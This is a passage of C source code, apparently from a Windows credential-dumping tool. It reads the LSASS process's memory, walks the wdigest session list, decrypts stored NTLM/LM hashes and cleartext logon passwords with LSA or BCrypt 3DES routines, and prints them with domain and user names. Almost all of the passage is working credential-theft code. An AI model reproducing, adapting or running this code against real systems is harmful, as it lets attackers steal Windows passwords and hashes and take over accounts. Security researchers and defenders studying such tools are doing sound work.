		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to call BcryptDecrypt() to decrypt buffer:\n\t Return Value: %.8x\n"), res);
		OutputDebugString(buffer);
		return FALSE;
	}

	BCryptCloseAlgorithmProvider(h3desProvider, 0);
	BCryptDestroyKey(h3desKey);
	if (buffer) HeapFree(GetProcessHeap(), 0, buffer); buffer = NULL;
	if (tmp) HeapFree(GetProcessHeap(), 0, tmp); tmp = NULL;
	if (lpIV) HeapFree(GetProcessHeap(), 0, lpIV); lpIV = NULL;
	if (lpKeyObj) HeapFree(GetProcessHeap(), 0, lpKeyObj); lpKeyObj = NULL;
	if (hBcryptDll) FreeLibrary(hBcryptDll);
	return TRUE;
}


BOOL DecryptHashes(LPBYTE lpNtlmCredsBlock, DWORD dwLength, PCREDS_INFOS aCredsInfos, int idx_session){
	ULONG i = 0;
	LPBYTE buffer = NULL;
	LPBYTE tmp = NULL;
	UINT random = 0;
	LPBYTE lpPlainText = NULL;

	buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, LARGE_BUFFER_SIZE * sizeof(BYTE));
	tmp = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SMALL_BUFFER_SIZE * sizeof(BYTE));

	// OS < Vista SP1
	if ((osvi.dwMajorVersion < 6) || (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0 && (_tcscmp(osvi.szCSDVersion, _T("")) == 0))){
		LsaInitAndDecrypt(lpNtlmCredsBlock, dwLength);
		FormatDecryptedHashes(lpNtlmCredsBlock, aCredsInfos, idx_session);
	} else{	// OS >= Vista SP1
		lpPlainText = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, LARGE_BUFFER_SIZE * sizeof(BYTE));
		BcryptInitAndDecrypt(lpNtlmCredsBlock, dwLength, lpPlainText);
		FormatDecryptedHashes(lpPlainText, aCredsInfos, idx_session);
		if (lpPlainText) HeapFree(GetProcessHeap(), 0, lpPlainText); lpPlainText = NULL;
	}
	
	if (buffer) HeapFree(GetProcessHeap(), 0, buffer); buffer = NULL;
	if (tmp) HeapFree(GetProcessHeap(), 0, tmp); tmp = NULL;
	return TRUE;
}

BOOL FormatDecryptedHashes(LPCBYTE lpDecryptedBlock, PCREDS_INFOS aCredsInfos, int idx_session){
	int i = 0;
	LPTSTR buffer = NULL, domain = NULL, username=NULL, lpszHashLM = NULL, lpszHashNT = NULL;
	TCHAR  lpszHash[3];
	HANDLE hLogonReader = INVALID_HANDLE_VALUE;

	// Structure of decrypted NTLM_CREDS_BLOCS structure :
	//  -------------------------------------------------------------------------------------------------------------------
	//  | Domain Length | Domain Offset | User Length | User Offset | NTLM Hash | LM Hash | ... | Domain Name | User Name |
	//  -------------------------------------------------------------------------------------------------------------------
	//       4 bytes         4 bytes        4 bytes       4 bytes     16 bytes   16 bytes   ...

	// In x64, 4 NTLM_CREDS_BLOCS first fields are 8 bytes long instead of 4

	buffer = (LPTSTR) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, LARGE_BUFFER_SIZE * sizeof(TCHAR));
	domain = (LPTSTR) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, LARGE_BUFFER_SIZE * sizeof(TCHAR));
	username = (LPTSTR) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, LARGE_BUFFER_SIZE * sizeof(TCHAR));
	lpszHashLM = (LPTSTR) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (HASH_LENGTH*2 + 1) * sizeof(TCHAR));
	lpszHashNT = (LPTSTR) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (HASH_LENGTH*2 + 1) * sizeof(TCHAR));
  lpszHash[2] = _T('\x00');

	// Offsets of hashs in NTLM_CREDS_BLOCS are different according processor
	#if defined _WIN64
		_sntprintf_s(domain, LARGE_BUFFER_SIZE, _TRUNCATE, _T("%ws"), &lpDecryptedBlock[lpDecryptedBlock[8]]); // Domain Name
		_sntprintf_s(username, LARGE_BUFFER_SIZE, _TRUNCATE, _T("%ws"), &lpDecryptedBlock[lpDecryptedBlock[24]]); // User Name

		for (i = 48; i < 48+HASH_LENGTH; i++) {
		  _stprintf_s(lpszHash, LARGE_BUFFER_SIZE, _T("%.2x"), lpDecryptedBlock[i]);
		  _tcscat_s(lpszHashLM, (HASH_LENGTH*2 + 1), lpszHash);
		}
		for (i = 32; i < 32+HASH_LENGTH; i++) {
		  _stprintf_s(lpszHash, LARGE_BUFFER_SIZE, _T("%.2x"), lpDecryptedBlock[i]);
		  _tcscat_s(lpszHashNT, (HASH_LENGTH*2 + 1), lpszHash);
		}

	#else
		_sntprintf_s(domain, LARGE_BUFFER_SIZE, _TRUNCATE, _T("%ws"), &lpDecryptedBlock[lpDecryptedBlock[4]]); // Domain Name
		_sntprintf_s(username, LARGE_BUFFER_SIZE, _TRUNCATE, _T("%ws"), &lpDecryptedBlock[lpDecryptedBlock[12]]); // User Name

		for (i = 32; i < 32+HASH_LENGTH; i++) {
		  _stprintf_s(lpszHash, LARGE_BUFFER_SIZE, _T("%.2x"), lpDecryptedBlock[i]);
		  _tcscat_s(lpszHashLM, (HASH_LENGTH*2 + 1), lpszHash);
		}
		for (i = 16; i < 16+HASH_LENGTH; i++) {
		  _stprintf_s(lpszHash, LARGE_BUFFER_SIZE, _T("%.2x"), lpDecryptedBlock[i]);
		  _tcscat_s(lpszHashNT, (HASH_LENGTH*2 + 1), lpszHash);
		}

	#endif
	
	_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Decrypted hashes : %s\\%s::%s:%s:::"), domain, username, lpszHashLM, lpszHashNT);
	OutputDebugString(buffer);

	strncpy_s(aCredsInfos[idx_session].Domain, sizeof(aCredsInfos[idx_session].Domain), domain, strlen(domain));
	aCredsInfos[idx_session].Domain[strlen(domain)] = '\0';
	strncpy_s(aCredsInfos[idx_session].Username, sizeof(aCredsInfos[idx_session].Username), username, strlen(username));
	aCredsInfos[idx_session].Username[strlen(username)] = '\0';
	strncpy_s(aCredsInfos[idx_session].LMhash, sizeof(aCredsInfos[idx_session].LMhash), lpszHashLM, strlen(lpszHashLM));
	aCredsInfos[idx_session].LMhash[strlen(lpszHashLM)] = '\0';
	strncpy_s(aCredsInfos[idx_session].NTLMhash, sizeof(aCredsInfos[idx_session].NTLMhash), lpszHashNT, strlen(lpszHashNT));
	aCredsInfos[idx_session].NTLMhash[strlen(lpszHashNT)] = '\0';

  if (lpszHashLM) HeapFree(GetProcessHeap(), 0, lpszHashLM); lpszHashLM = NULL;
  if (lpszHashNT) HeapFree(GetProcessHeap(), 0, lpszHashNT); lpszHashNT = NULL;
	if (buffer) HeapFree(GetProcessHeap(), 0, buffer); buffer = NULL;
  if (domain) HeapFree(GetProcessHeap(), 0, domain); domain = NULL;
	if (username) HeapFree(GetProcessHeap(), 0, username); username = NULL;
  if (hLogonReader != INVALID_HANDLE_VALUE) CloseHandle(hLogonReader);
	return TRUE;
}


int GetWdigestPasswords(PCREDS_INFOS aCredsInfos){
	LPVOID WdigestSessionList = NULL;
	LPBYTE buffer = NULL, tmp = NULL;
	LPTSTR lpDomain = NULL, lpUsername = NULL, lpPassword = NULL, lpPlainText = NULL;
	int i = 0, idx_session = -1;
	int cbSessionEntry = 0;

	// pointers to SESSION_ENTRY structures
	LPVOID lpWdigestListEntry = NULL;
	PWDIGEST_NT51_SESSION_ENTRY lpWdigestListEntryNT51 = NULL;
	PWDIGEST_NT52_SESSION_ENTRY lpWdigestListEntryNT52 = NULL;
	PWDIGEST_NT6_SESSION_ENTRY lpWdigestListEntryNT6 = NULL;

	// pointers to internal fields of SESSION_ENTRY structures
	LPVOID lpSessionFlink = NULL;
	PUNICODE_STRING lpSessionUserName = NULL;
	PUNICODE_STRING lpSessionDomainName = NULL;
	PUNICODE_STRING lpSessionPassword = NULL;
	PLUID lpSessionLuid = NULL;
	
	if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1){
		// Get size of WDIGEST_NT51_SESSION_ENTRY structure
		cbSessionEntry = sizeof(WDIGEST_NT51_SESSION_ENTRY);
		// Allocate memory for WDIGEST_NT51_SESSION_ENTRY
		lpWdigestListEntryNT51 = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WDIGEST_NT51_SESSION_ENTRY));
		// Set pointer to the specific Windows version structure
		lpWdigestListEntry = lpWdigestListEntryNT51;
	} else if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2){
		cbSessionEntry = sizeof(WDIGEST_NT52_SESSION_ENTRY);
		lpWdigestListEntryNT52 = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WDIGEST_NT52_SESSION_ENTRY));
		lpWdigestListEntry = lpWdigestListEntryNT52;
	} else{
		cbSessionEntry = sizeof(WDIGEST_NT6_SESSION_ENTRY);
		lpWdigestListEntryNT6 = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WDIGEST_NT6_SESSION_ENTRY));
		lpWdigestListEntry = lpWdigestListEntryNT6;
	}
	
	buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, LARGE_BUFFER_SIZE * sizeof(BYTE));
	tmp = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SMALL_BUFFER_SIZE * sizeof(BYTE));
	WdigestDllBaseAddr = GetDllBaseAddr(GetProcessId(hLsass), _T("wdigest.dll"));

	_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Wdigest.dll?l_LogSessList: %ph\n"), (WdigestDllBaseAddr + symbAddr.WdigestSessionList));
	OutputDebugString(buffer);

	if(!ReadProcessMemory(hLsass, (LPCVOID)(WdigestDllBaseAddr + symbAddr.WdigestSessionList), &WdigestSessionList, sizeof(WdigestSessionList), NULL)){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read WdigestSessionList: %d\n"), GetLastError());
		OutputDebugString(buffer);
		return FALSE;
	}

	if (WdigestSessionList){
		do {
			if (!ReadProcessMemory(hLsass, (LPCVOID) WdigestSessionList, (LPVOID) lpWdigestListEntry, cbSessionEntry, NULL)){
				_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read WdigestListEntry: %d\n"), GetLastError());
				OutputDebugString(buffer);
				return idx_session;
			}

			// Set pointers to internal fields of the specific Windows version structure
			if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1){
				lpSessionFlink = lpWdigestListEntryNT51->Flink;
				lpSessionUserName = &(lpWdigestListEntryNT51->Username);
				lpSessionDomainName = &(lpWdigestListEntryNT51->Domain);
				lpSessionPassword = &(lpWdigestListEntryNT51->Password);
				lpSessionLuid = &(lpWdigestListEntryNT51->LocallyUniqueIdentifier);
			} else if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2){
				lpSessionFlink = lpWdigestListEntryNT52->Flink;
				lpSessionUserName = &(lpWdigestListEntryNT52->Username);
				lpSessionDomainName = &(lpWdigestListEntryNT52->Domain);
				lpSessionPassword = &(lpWdigestListEntryNT52->Password);
				lpSessionLuid = &(lpWdigestListEntryNT52->LocallyUniqueIdentifier);
			} else{
				lpSessionFlink = lpWdigestListEntryNT6->Flink;
				lpSessionUserName = &(lpWdigestListEntryNT6->Username);
				lpSessionDomainName = &(lpWdigestListEntryNT6->Domain);
				lpSessionPassword = &(lpWdigestListEntryNT6->Password);
				lpSessionLuid = &(lpWdigestListEntryNT6->LocallyUniqueIdentifier);
			}

			_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("WdigestListEntry->Flink: %ph\n"), lpSessionFlink);
			OutputDebugString(buffer);

			// memory allocation for username, domain and password
			lpDomain = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (lpSessionDomainName->MaximumLength + 1) * sizeof(TCHAR));
			lpUsername = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (lpSessionUserName->MaximumLength + 1) * sizeof(TCHAR));
			lpPassword = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (lpSessionPassword->MaximumLength + 1) * sizeof(TCHAR));
			
			if(!ReadProcessMemory(hLsass, (LPCVOID) lpSessionDomainName->Buffer, (LPVOID) lpDomain, lpSessionDomainName->MaximumLength, NULL)){
				_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read Domain in memory: %d\n"), GetLastError());
				OutputDebugString(buffer);
				return FALSE;
			}
			_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Domain: %S\n"), lpDomain);
			OutputDebugString(buffer);

			if(!ReadProcessMemory(hLsass, (LPCVOID) lpSessionUserName->Buffer, (LPVOID) lpUsername, lpSessionUserName->MaximumLength, NULL)){
				_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read Username in memory: %d\n"), GetLastError());
				OutputDebugString(buffer);
				return FALSE;
			}
			_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Username: %S\n"), lpUsername);
			OutputDebugString(buffer);

			if(!ReadProcessMemory(hLsass, (LPCVOID) lpSessionPassword->Buffer, (LPVOID) lpPassword, lpSessionPassword->MaximumLength, NULL)){
				_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read cipher Password in memory: %d\n"), GetLastError());
				OutputDebugString(buffer);
				return FALSE;
			} else{
				if ((lpSessionLuid->LowPart != 0x3e4) && // NETWORK SERVICE LUID
						(lpSessionLuid->LowPart != 0x3e5) && // LOCAL SERVICE LUID
						(lpSessionLuid->LowPart != 0x3e7) // LOCALSYSTEM LUID
						){
					if (lpSessionPassword->MaximumLength > 0){
						// Decrypt passwords from memory if password present
						if ((osvi.dwMajorVersion < 6) || (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0 && (_tcscmp(osvi.szCSDVersion, _T("")) == 0))){
							LsaInitAndDecrypt(lpPassword, lpSessionPassword->MaximumLength);
						} else {
							lpPlainText = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, LARGE_BUFFER_SIZE * sizeof(TCHAR));
							BcryptInitAndDecrypt(lpPassword, lpSessionPassword->MaximumLength, lpPlainText);

							memcpy_s(lpPassword, lpSessionPassword->MaximumLength, lpPlainText, lpSessionPassword->MaximumLength);
							
							if (lpPlainText) HeapFree(GetProcessHeap(), 0, lpPlainText); lpPlainText = NULL;
						}

						_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Uncipher password: %S\n"), lpPassword);
						OutputDebugString(buffer);
					}
					idx_session++;

					_sntprintf_s(aCredsInfos[idx_session].Domain, sizeof(aCredsInfos[idx_session].Domain), _TRUNCATE, _T("%ws"), lpDomain);
					_sntprintf_s(aCredsInfos[idx_session].Username, sizeof(aCredsInfos[idx_session].Username), _TRUNCATE, _T("%ws"), lpUsername);
					_sntprintf_s(aCredsInfos[idx_session].Password, sizeof(aCredsInfos[idx_session].Password), _TRUNCATE, _T("%ws"), lpPassword);

					_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("ID session : %d\n"), idx_session);
					OutputDebugString(buffer);
					_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("\tPassword : %s\n"), aCredsInfos[idx_session].Password);
					OutputDebugString(buffer);
					_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("\tUsername : %s\n"), aCredsInfos[idx_session].Username);
					OutputDebugString(buffer);
					_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("\tDomain : %s\n"), aCredsInfos[idx_session].Domain);
					OutputDebugString(buffer);
				} 
				OutputDebugString(_T("----------------------------------------------\n"));
			}

			WdigestSessionList = lpSessionFlink;
			// Clean Heap buffer
			if (lpUsername) HeapFree(GetProcessHeap(), 0, lpUsername); lpUsername = NULL;
			if (lpDomain) HeapFree(GetProcessHeap(), 0, lpDomain); lpDomain = NULL;
			if (lpPassword) HeapFree(GetProcessHeap(), 0, lpPassword); lpPassword = NULL;
		} while ((DWORD_PTR)lpSessionFlink != (DWORD_PTR)(WdigestDllBaseAddr + symbAddr.WdigestSessionList));
	}

	if (WdigestSessionList) WdigestSessionList = NULL;
	if (lpWdigestListEntry) lpWdigestListEntry = NULL;
	if (lpSessionFlink) lpSessionFlink = NULL;
	if (lpSessionUserName) lpSessionUserName = NULL;
	if (lpSessionDomainName) lpSessionDomainName = NULL;
	if (lpSessionPassword) lpSessionPassword = NULL;
	if (lpSessionLuid) lpSessionLuid = NULL;
	if (lpWdigestListEntryNT51) HeapFree(GetProcessHeap(), 0, lpWdigestListEntryNT51); lpWdigestListEntryNT51 = NULL;
	if (lpWdigestListEntryNT52) HeapFree(GetProcessHeap(), 0, lpWdigestListEntryNT52); lpWdigestListEntryNT52 = NULL;
	if (lpWdigestListEntryNT6) HeapFree(GetProcessHeap(), 0, lpWdigestListEntryNT6); lpWdigestListEntryNT6 = NULL;
	if (buffer) HeapFree(GetProcessHeap(), 0, buffer); buffer = NULL;
	if (tmp) HeapFree(GetProcessHeap(), 0, tmp); tmp = NULL;
	return idx_session;
}
